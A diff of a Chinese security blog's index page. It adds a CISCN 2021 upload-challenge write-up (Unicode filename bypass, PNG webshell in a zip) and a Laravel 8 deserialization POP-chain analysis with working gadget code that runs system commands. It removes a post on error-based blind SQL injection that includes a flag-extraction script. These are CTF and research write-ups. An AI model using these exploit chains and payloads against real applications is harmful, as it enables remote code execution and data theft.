@@ -207,6 +207,351 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/CISCN2021upload.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/CISCN2021upload.html" class="post-title-link" itemprop="url">CISCN2021-upload</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-05-17 00:41:29 / 修改时间：00:41:31" itemprop="dateCreated datePublished" datetime="2021-05-17T00:41:29+08:00">2021-05-17</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.9k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="CISCN2021-Quals-upload"><a href="#CISCN2021-Quals-upload" class="headerlink" title="[CISCN2021 Quals]upload"></a>[CISCN2021 Quals]upload</h1><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>题目给出源码index.php、example.php.</p>
+<p>index.php明显是一个上传，做出了如下限制。</p>
+<ol>
+<li>上传需要绕过<code>getimagesize</code>。</li>
+<li>图片的长宽必须为1.</li>
+<li>文件名不能有c、i、h</li>
+</ol>
+<p>绕过<code>getimagesize</code>比较简单使用XMB头就行了</p>
+<pre><code>#define test_width 1
+#define test_height 1</code></pre><p>图片名绕过<code>stristr</code>这一点想了比久直到看到<code>mb_strtolower</code>，发现他可以使用<code>Unicode</code></p>
+<img src="https://goodcheerleung.gitee.io/macpic/image-20210516222420731.png" alt="image-20210516222420731" style="zoom:50%;">
+
+<p>在谷歌找到这么一篇文章<a href="https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/" target="_blank" rel="noopener">https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/</a></p>
+<p>通过fuzz可以知道部分字母在经过<code>mb_strtolower</code>处理过可以等效普通字母的。</p>
+<p>如 <code>i</code>可以用(%C5%BF)代替。本来以为可以直接上传php，无奈没有相关字母可以代替。这个还得看<code>example.php</code>下面结合<code>example.php</code>再具体分析。</p>
+<pre><code class="php"> &lt;?php
+if (!isset($_GET[&quot;ctf&quot;])) {
+    highlight_file(__FILE__);
+    die();
+}
+
+if(isset($_GET[&quot;ctf&quot;]))
+    $ctf = $_GET[&quot;ctf&quot;];
+
+if($ctf==&quot;upload&quot;) {
+    if ($_FILES[&#39;postedFile&#39;][&#39;size&#39;] &gt; 1024*512) {
+        die(&quot;这么大个的东西你是想d我吗？&quot;);
+    }
+    $imageinfo = getimagesize($_FILES[&#39;postedFile&#39;][&#39;tmp_name&#39;]);
+    if ($imageinfo === FALSE) {
+        die(&quot;如果不能好好传图片的话就还是不要来打扰我了&quot;);
+    }
+    if ($imageinfo[0] !== 1 &amp;&amp; $imageinfo[1] !== 1) {
+        die(&quot;东西不能方方正正的话就很讨厌&quot;);
+    }
+    $fileName=urldecode($_FILES[&#39;postedFile&#39;][&#39;name&#39;]);
+    if(stristr($fileName,&quot;c&quot;) || stristr($fileName,&quot;i&quot;) || stristr($fileName,&quot;h&quot;) || stristr($fileName,&quot;ph&quot;)) {
+        die(&quot;有些东西让你传上去的话那可不得了&quot;);
+    }
+    $imagePath = &quot;image/&quot; . mb_strtolower($fileName);
+    if(move_uploaded_file($_FILES[&quot;postedFile&quot;][&quot;tmp_name&quot;], $imagePath)) {
+        echo &quot;upload success, image at $imagePath&quot;;
+    } else {
+        die(&quot;传都没有传上去&quot;);
+    }
+}
+</code></pre>
+<p>从<code>example</code>的代码可以直接知道咱么需要上传<code>zip</code>格式然后通过这个程序解压,这个正好前面知道<code>i</code>的绕过方法。但是这里需要绕过<code>imagecreatefrompng</code>,<code>imagepng</code>如果直接在图片最后写一个一句话木马，会被GD库给去掉。绕过GD库可以参考这篇文章：<a href="http://www.vuln.cn/6411" target="_blank" rel="noopener">http://www.vuln.cn/6411</a> ，但是这个作者写的脚本有毒图片经过<code>imagepng</code>处理后乱码，浪费了几个小时。最后用这个脚本来生成图片马：<a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator" target="_blank" rel="noopener">https://github.com/huntergregal/PNG-IDAT-Payload-Generator</a></p>
+<pre><code class="php"> &lt;?php
+if (!isset($_GET[&quot;ctf&quot;])) {
+    highlight_file(__FILE__);
+    die();
+}
+
+if(isset($_GET[&quot;ctf&quot;]))
+    $ctf = $_GET[&quot;ctf&quot;];
+
+if($ctf==&quot;poc&quot;) {
+    $zip = new \ZipArchive();
+    $name_for_zip = &quot;example/&quot; . $_POST[&quot;file&quot;];
+    if(explode(&quot;.&quot;,$name_for_zip)[count(explode(&quot;.&quot;,$name_for_zip))-1]!==&quot;zip&quot;) {
+        die(&quot;要不咱们再看看？&quot;);
+    }
+    if ($zip-&gt;open($name_for_zip) !== TRUE) {
+        die (&quot;都不能解压呢&quot;);
+    }
+
+    echo &quot;可以解压，我想想存哪里&quot;;
+    $pos_for_zip = &quot;/tmp/example/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);
+    $zip-&gt;extractTo($pos_for_zip);
+    $zip-&gt;close();
+    unlink($name_for_zip);
+    $files = glob(&quot;$pos_for_zip/*&quot;);
+    foreach($files as $file){
+        if (is_dir($file)) {
+            continue;
+        }
+        $first = imagecreatefrompng($file);
+        $size = min(imagesx($first), imagesy($first));
+        $second = imagecrop($first, [&#39;x&#39; =&gt; 0, &#39;y&#39; =&gt; 0, &#39;width&#39; =&gt; $size, &#39;height&#39; =&gt; $size]);
+        if ($second !== FALSE) {
+            $final_name = pathinfo($file)[&quot;basename&quot;];
+            imagepng($second, &#39;example/&#39;.$final_name);
+            imagedestroy($second);
+        }
+        imagedestroy($first);
+        unlink($file);
+    }
+
+}
+</code></pre>
+<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><h3 id="制作图片马以及压缩包"><a href="#制作图片马以及压缩包" class="headerlink" title="制作图片马以及压缩包"></a>制作图片马以及压缩包</h3><p>用上面的脚本直接生成图片马。</p>
+<img src="https://goodcheerleung.gitee.io/macpic/image-20210516232251994.png" alt="image-20210516232251994" style="zoom:50%;">
+
+<p>然后将图片头给压入压缩包里面。先将下面的文件头写进一个文本文件，注意一定要加一行换行否则识别不出来。因为后面需要解压，这个文件头需要放到压缩包后面。</p>
+<pre><code>
+#define test_width 1
+#define test_height 1</code></pre><p>用常见的隐写方法：</p>
+<pre><code>copy shell.zip/b+b.txt/a sb.zip</code></pre><img src="https://goodcheerleung.gitee.io/macpic/image-20210516232922249.png" alt="image-20210516232922249" style="zoom:50%;">
+
+<h3 id="绕过文件名检测上传ZIP"><a href="#绕过文件名检测上传ZIP" class="headerlink" title="绕过文件名检测上传ZIP"></a>绕过文件名检测上传ZIP</h3><p><img src="https://goodcheerleung.gitee.io/macpic/image-20210517001809377.png" alt="image-20210517001809377"></p>
+<h3 id="解压文件"><a href="#解压文件" class="headerlink" title="解压文件"></a>解压文件</h3><p><img src="https://goodcheerleung.gitee.io/macpic/image-20210517002001649.png" alt="image-20210517002001649"></p>
+<p>文件会被解压到example文件夹下</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/image-20210517002205315.png" alt="image-20210517002205315"></p>
+<h3 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h3><p><img src="https://goodcheerleung.gitee.io/macpic/image-20210517003324748.png" alt="image-20210517003324748"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/Laravel8POP.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/Laravel8POP.html" class="post-title-link" itemprop="url">Laravel8反序列化POP链分析</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-05-16 00:41:14" itemprop="dateCreated datePublished" datetime="2021-05-16T00:41:14+08:00">2021-05-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-17 00:41:22" itemprop="dateModified" datetime="2021-05-17T00:41:22+08:00">2021-05-17</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Laravel8反序列化POP链分析"><a href="#Laravel8反序列化POP链分析" class="headerlink" title="Laravel8反序列化POP链分析"></a>Laravel8反序列化POP链分析</h1><h2 id="POP链一"><a href="#POP链一" class="headerlink" title="POP链一"></a>POP链一</h2><p>使用<code>\vendor\laravel\framework\src\Illuminate\Broadcasting\PendingBroadcast.php</code>中<code>__destruct</code>方法。其中<code>events</code>和<code>event</code>都可控，那么咱们就可以指定一个存在<code>dispatch</code>方法的类来继续寻找能够RCE的方法，并且这个<code>dispatch</code>必须是可以传参的。</p>
+<img src="https://goodcheerleung.gitee.io/macpic/image-20210512152716814.png" alt="image-20210512152716814" style="zoom:50%;">
+
+<p>全局搜索在<code>\vendor\laravel\framework\src\Illuminate\Bus\Dispatcher.php</code>下就存在一个<code>dispatch</code>方法，是一个简单的三目运算。咱们先看如果前面运算为<code>True</code>情况下进入<code>dispatchToQueue</code>有没有RCE的可能。</p>
+<img src="https://goodcheerleung.gitee.io/macpic/image-20210512153224762.png" alt="image-20210512153224762" style="zoom:50%;">
+
+<p>跟进<code>dispatchToQueue</code>方法可以看到该方法存在调用<code>call_user_func</code>的其中参数1就是<code>dispatch</code>方法下的<code>$this-&gt;queueResolver</code>，是可控的，参数2是传入<code>$command</code>变量的一个属性。因此可以知道<code>$command</code>数据类型必须为一个对象。</p>
+<img src="https://goodcheerleung.gitee.io/macpic/image-20210512153428951.png" alt="image-20210512153428951" style="zoom:50%;">
+
+<p>分析完<code>dispatchToQueue</code>咱们回到<code>dispatch</code>方法。要想进入<code>dispatchToQueue</code>需要<code>queueResolver</code>为<code>True</code>这个很简单，随便一个函数名就行了。我们只需要看<code>$this-&gt;commandShouldBeQueued($command)</code>能否返回为<code>True</code>,我们跟进这个方法。通过该方法注释就能快速看出该方法返回值就是一个<code>Bool</code>类型，怎样才能让其返回<code>true</code>呢？可以看到其对<code>$command</code>的类型进行了判断，只要是 <code>ShouldQueue</code>对象就返回<code>True</code>。</p>
+<img src="https://goodcheerleung.gitee.io/macpic/image-20210512153958899.png" alt="image-20210512153958899" style="zoom:50%;">
+
+<p>因此咱们再找一个 继承<code>ShouldQueue</code>的方法即可。</p>
+<img src="https://goodcheerleung.gitee.io/macpic/image-20210512225734552.png" alt="image-20210512225734552" style="zoom:50%;">
+
+<p>那么这条链的思路就清晰了，因此构造如下POP链：</p>
+<pre><code class="php">&lt;?php
+namespace Illuminate\Broadcasting{
+class PendingBroadcast
+{
+    protected $events;
+    protected $event;
+      public function __construct($events, $event)
+    {
+        $this-&gt;event = $event;
+        $this-&gt;events = $events;
+    }
+}
+}
+
+namespace Illuminate\Broadcasting{
+
+    class BroadcastEvent{
+        public $connection;
+        public function __construct($command){
+            $this-&gt;connection = $command;
+        }
+    }
+}
+namespace Illuminate\Bus{
+    class Dispatcher {
+    protected $queueResolver;//该属性为call_user_fun的第一个参数
+    public function __construct($queueResolver)
+        {
+            $this-&gt;queueResolver = $queueResolver;
+        }
+    }
+}
+namespace{
+    $b = new Illuminate\Bus\Dispatcher(&quot;system&quot;);//存在dispatch方法
+    $c = new Illuminate\Broadcasting\BroadcastEvent(&quot;whoami&quot;);
+    $a = new Illuminate\Broadcasting\PendingBroadcast($b,$c);
+    echo urlencode(serialize($a));
+}
+
+?&gt;</code></pre>
+<h2 id="POP链二"><a href="#POP链二" class="headerlink" title="POP链二"></a>POP链二</h2><p>除了寻找存在<code>dispatch</code>方法的还可以找到存在<code>call</code>的类例如<code>laravel/vendor/laravel/framework/src/Illuminate/Validation/Validator.php</code>就存在一个<code>call</code>，代码简单看一下他会对传入的<code>$mothod</code>我们用上一个链的入口那么<code>$mothod</code>的值将会固定为<code>dispatch</code>。而想进入第一个分支则需要在<code>$extensions</code>数组中存在下标为<code>$rule</code>的值,<code>$rule</code>的值是从<code>$mothod</code>的第八位开始取得正好为空，我们只需要定义<code>$extensions[&quot;&quot;=&gt;&#39;值&#39;]</code>即可进入第一个分支。</p>
+<img src="https://goodcheerleung.gitee.io/macpic/image-20210514101236842.png" alt="image-20210514101236842" style="zoom:50%;">
+
+<p>我们继续跟进 <code>callExtension</code>方法。可以看到这里使用了动态拼接函数，而这个回调函数<code>（$callback）</code>正是<code>$extensions</code>中键名为空的值。参数就是<code>$method</code>所传入的值。</p>
+<img src="https://goodcheerleung.gitee.io/macpic/image-20210514101822090.png" alt="image-20210514101822090" style="zoom:50%;">
+
+<p>据此可以构造如下POP链：</p>
+<pre><code class="php">&lt;?php
+namespace Illuminate\Broadcasting{
+class PendingBroadcast
+{
+    protected $events;
+    protected $event;
+      public function __construct($events, $event)
+    {
+        $this-&gt;event = $event;
+        $this-&gt;events = $events;
+    }
+}
+}
+
+namespace Illuminate\Validation{
+    class Validator{
+         public $extensions = [&#39;&#39;=&gt;&#39;phpinfo&#39;];
+    }
+}
+
+namespace{
+    $b = new Illuminate\Validation\Validator();
+    $c = 1;
+    $a = new Illuminate\Broadcasting\PendingBroadcast($b,$c);
+    echo urlencode(serialize($a));
+}
+?&gt;</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/c884ec29bf3ccc94.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1966,462 +2311,6 @@ for i in range(1,70):
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/spatial_functions_blind_inject.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/spatial_functions_blind_inject.html" class="post-title-link" itemprop="url">一种基于运行错误的Bool型盲注原理剖析</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-03-17 09:22:09 / 修改时间：09:22:18" itemprop="dateCreated datePublished" datetime="2021-03-17T09:22:09+08:00">2021-03-17</time>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>4.5k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>4 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="一种基于运行错误的Bool型盲注原理剖析"><a href="#一种基于运行错误的Bool型盲注原理剖析" class="headerlink" title="一种基于运行错误的Bool型盲注原理剖析"></a>一种基于运行错误的Bool型盲注原理剖析</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>文章首发于<strong>i春秋</strong></p>
-<p>老规矩，我已经将靶机封装到Docker镜像中供各位观众姥爷们食用。</p>
-<pre><code>靶机Docker镜像：gqleung/spatial_functions_blind_inject</code></pre><p>什么是<code>基于运行错误的Bool型盲注</code>？</p>
-<p>简单的说就是它能够通过MYSQL解释器检查，但是运行时候又会产生错的函数。我们可以用它来进行布尔型盲注。我们下面就来讲解一下一些能够通过MYSQL解释器的预检查却在运行时候出现错误的SQL函数。</p>
-<h4 id="Spatial-Functions"><a href="#Spatial-Functions" class="headerlink" title="Spatial Functions"></a><span id="spatial">Spatial Functions</span></h4><p><code>ST_GeomFromText</code>、<code>ST_MPointFromText</code>是两个可以从<code>文本</code>中解析Spatial function的函数，如果我们的语法各方面都复合mysql的规则，如果我们在解析文本中做手脚呢？MYSQL解释器不会检查一个字符串是否复合MYSQL语法要求，很明显这样我们就可以绕过MYSQL预检查，但是在运行时候又「恰逢其时」地出错，这样我们就可以进行Bool盲注了。需要注意的是<code>ST_GeomFromText</code>针对的是<code>POINT()</code>函数，<code>ST_MPointFromText</code>针对的是<code>MULTIPOINT()</code>函数的。</p>
-<p>以<code>ST_GeomFromText</code>为例：</p>
-<p>例如构造如下SQL语句,很明显POINT函数传入的必须是GIS中的地理坐标的数据类型，这里写入的是一个常量或者undefined类型，但是他却能正常运行。</p>
-<pre><code class="MYSQL">mysql&gt; SELECT IF(0, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0);
-+---------------------------------------------------+
-| IF(0, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0) |
-+---------------------------------------------------+
-|                                                 0 |
-+---------------------------------------------------+
-1 row in set (0.00 sec)</code></pre>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-011441@2x.png" alt="WX20210126-011441@2x"></p>
-<p>假设我们将<code>if</code>的表达式改成<code>false</code>呢，很明显会执行中间的参数，POINT的数据类型错误会导致报错。</p>
-<pre><code class="mysql">mysql&gt; SELECT IF(1, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0);
-ERROR 3037 (22023): Invalid GIS data provided to function st_geometryfromtext.</code></pre>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-012024@2x.png" alt="WX20210126-012024@2x"></p>
-<ul>
-<li>注意在Mysql5.7.6以上版本 ST_X、ST_GeomFromText已经被弃用，使用<code>ST_GeomFromText(&#39;POINT(mads)&#39;)</code>代替即可</li>
-</ul>
-<p>总结，其他可用的函数：</p>
-<pre><code class="MYSQL">SELECT IF({}, ST_X(ST_GeomFromText(&#39;POINT(mads)&#39;)), 0);
-SELECT IF({}, ST_MPointFromText(&#39;MULTIPOINT (mads)&#39;),0);
-SELECT IF({}, ST_X(MADS), 0);
-SELECT IF({}, ST_MPointFromText(&#39;MADS&#39;),0);
-SELECT IF({}, ST_GeomFromText(&#39;MADS&#39;),0);</code></pre>
-<p>我们再来看我们的靶机<code>(Docker镜像：gqleung/tmd_sz_fsl)</code></p>
-<p>经过fuzz可以发现这个靶机不论参数传递数字都是会返回同一张图，但是如果存在被ban掉的字符会返回如下图：</p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-014859@2x.png" alt="WX20210126-014859@2x"></p>
-<p>我们可以借此FUZZ出被ban掉的关键字：</p>
-<pre><code class="MYSQL">union、*、&#39;、&quot;、substr、mid、=、like、into、file、sleep、benchmark、 、^、or、、、、&amp;、&gt;、&lt;、#、-、ascii、ord、floor、extractvalue、updatexml、if、rp、rep、GET_LOCK、info</code></pre>
-<ul>
-<li><p>这里过滤了空格，这里可以直接用<code>\t</code>来代替空格，URL编码后是%09,在写脚本时候可以使用TAB键来代替。</p>
-</li>
-<li><p>过滤了单双引号，可以使用十六进制来代替字符串。</p>
-</li>
-<li><p>过滤了<code>if</code>可以使用<code>case when....then....else...end</code>代替</p>
-</li>
-<li><p>过滤了等于号、大于、小于、减号、like、我们可以使用正则表达式来判断也就是regexp</p>
-</li>
-</ul>
-<p>我们通过上面所讲解的<code>ST_GeomFromText</code>,结合上述过滤考点，构造如下payload,当然空格要用%09代替。</p>
-<pre><code>index.php?cat=1%09and%09IF(0,ST_X(ST_GeomFromText(0x504F494E54286D61647329)),0)</code></pre><p>如果if表达式为false可以发现返回正常的页面：</p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-020116@2x.png" alt="WX20210126-020116@2x"></p>
-<p>若if表达式为true,那么将会返回运行错误的页面：</p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-020240@2x.png" alt="WX20210126-020240@2x"></p>
-<p>据此编写Python脚本：</p>
-<pre><code class="PYTHON">#author：Gqleung
-#Email:  admin@plasf.cn
-#blog:   http://www.plasf.cn
-
-import requests
-
-def ord2hex(string):
-    result = &quot;&quot;
-    for i in string:
-        r = hex(ord(i));
-        r = r.replace(&#39;0x&#39;,&#39;&#39;)
-        result = result+r
-    return &#39;0x&#39;+result
-
-url = &quot;http://47.98.234.232:28076/index.php?cat=&quot;
-tables = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-}{&#39;
-result=&quot;&quot;
-for i in range(1,70):
-    for j in tables:
-        if j ==&quot;{&quot; or j==&quot;}&quot;:
-            j=&#39;\\&#39;+j
-        payload = &quot;1    and    IF((select    flag    from    flag)    regexp    binary    %s,    ST_X(ST_GeomFromText(0x504F494E54286D61647329)),    0)&quot;%(ord2hex(&quot;^&quot;+result+j))
-        r = requests.get(url+payload);
-        if &#39;cat&#39; not in r.text:
-            result=result+j
-            print(result.replace(&#39;\\&#39;,&#39;&#39;))
-            break</code></pre>
-<p>运行结果：</p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-021628@2x.png" alt="WX20210126-021628@2x"></p>
-<h4 id="FLOOR-X"><a href="#FLOOR-X" class="headerlink" title="FLOOR(X)"></a>FLOOR(X)</h4><p>咱们先了解<a href="#floor">主键重复报错注入</a>的原理</p>
-<h4 id="主键重复报错注入"><a href="#主键重复报错注入" class="headerlink" title="主键重复报错注入"></a>主键重复报错注入</h4><h5 id="FLOOR-X-1"><a href="#FLOOR-X-1" class="headerlink" title="FLOOR(X)"></a><span id="floor">FLOOR(X)</span></h5><p>该函数返回X的最大整数值，但不能大于X，也就是向下取整。</p>
-<p>例如,下列语句5.20返回的值将会是5.</p>
-<pre><code class="mysql">select floor(5.20)</code></pre>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-083818@2x.png" alt="WX20201225-083818@2x"></p>
-<p>我们先来看Payload再来分析其中的原理</p>
-<pre><code class="mysql">select count(*),(concat(floor(rand(0)*2),(select user())))x from user group by x;</code></pre>
-<ul>
-<li>Q1为什么用<code>floor(rand(0)*2)</code>?</li>
-</ul>
-<p>要回答这个问题，必须从floor报错注入的原理理解：</p>
-<p>例如，user()中含有五条数据：</p>
-<pre><code class="mysql">select rand() from user</code></pre>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-093334@2x.png" alt="WX20201225-093334@2x"></p>
-<p>可以发现会随机生成小于0的随机数。当然<code>rand()*2</code>生成<code>0-1</code>的随机数</p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-093851@2x.png" alt="WX20201225-093851@2x"></p>
-<p>加上floor就是取整。会生成0或者1的随机值：</p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094006@2x.png" alt="WX20201225-094006@2x"></p>
-<p>但是为什么用rand(0)呢？</p>
-<p>Rand()两次运行的结果，可以明显地看到rand()产生的结果是随机的。</p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094117@2x.png" alt="WX20201225-094117@2x"></p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094710@2x.png" alt="WX20201225-094710@2x"></p>
-<p>Rand(0)两次运行的结果，可以发现两次运行的结果完全一致，说明<code>rand(0)</code>是伪随机的。</p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094830@2x.png" alt="WX20201225-094830@2x"></p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094830@2x.png" alt="WX20201225-094830@2x"></p>
-<p>我们再来了解一下<code>group by</code> 的运作过程。</p>
-<blockquote>
-<p>GROUP BY 语句用于结合聚合函数，根据一个或多个列对结果集进行分组。</p>
-</blockquote>
-<p>例如:如下SQL语句：</p>
-<pre><code class="mysql">select id as &quot;number&quot;, contents as &quot;内容&quot; from cat group by number</code></pre>
-<p>执行该sql语句会生成一个新的虚拟表，group by 即指定虚拟表中的对应字段来作为主键。</p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210120-131144@2x.png" alt="WX20210120-131144@2x"></p>
-<p>我们知道主键只能是唯一的，如果主键出现重复的情况就会发生报错，将重复的主键输出在报错信息中，我们回过头来看报错注入的Payload.</p>
-<pre><code class="mysql">select count(*),(concat(floor(rand(0)*2),(select user())))x from user group by x;</code></pre>
-<p>我们看到这里以x 为主键,<code>rand(0)*2</code>生成0-2之间的伪随机数，同时使用<code>floor</code>来取整，出现的只能是值为0或者1（当然前提是表所存储的记录条数要&gt;3条才有可能重复）。使用<code>concat</code>将要查询的内容拼接入主键，这样在报错时会将咱们想要的内容作为报错信息输出。</p>
-<p>例如：</p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210120-133637@2x.png" alt="WX20210120-133637@2x"></p>
-<p>注：输出字符长度限制为64个字符</p>
-<p>我们了解完FLOOR（X）报错注入原理后开始从FLOOR(X)报错注入盲注来简述其中的道理，我们直接从payload来看：</p>
-<pre><code class="mysql">select count(*),floor(rand(0)*2)x from cat group by if(1,x,0);</code></pre>
-<p>我们知道floor(rand(0)*2)产生的随机数是伪随机数范围在0-1，如果将其参数的结果作为主键就会造成报错，假设我们用<code>if</code>语句来控制x是否作为主键呢？这就有可能造成不报错的情况，用此来作为报错注入盲注。通常情况与<a href="#spatial">Spatial Functions</a>报错注入盲注类似。</p>
-<pre><code class="mysql">mysql&gt; select count(*),floor(rand(0)*2)x from cat group by if(1,x,0);
-ERROR 1062 (23000): Duplicate entry &#39;1&#39; for key &#39;&lt;group_key&gt;&#39;
-mysql&gt; select count(*),floor(rand(0)*2)x from cat group by if(0,x,0);
-+----------+---+
-| count(*) | x |
-+----------+---+
-|        2 | 0 |
-+----------+---+
-1 row in set (0.00 sec)</code></pre>
-<h4 id="数据溢出型"><a href="#数据溢出型" class="headerlink" title="数据溢出型"></a>数据溢出型</h4><p>在报错注入中数据溢出的函数同样可用如下。</p>
-<pre><code class="mysql">mysql&gt; select pow(2,1024);
-ERROR 1690 (22003): DOUBLE value is out of range in &#39;pow(2,1024)&#39;
-mysql&gt; select cot(0);
-ERROR 1690 (22003): DOUBLE value is out of range in &#39;cot(0)&#39;
-mysql&gt; select exp(710);
-ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</code></pre>
-<p>### </p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/desctf12.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/desctf12.html" class="post-title-link" itemprop="url">Desctf12月月赛</a>
-        </h2>
-
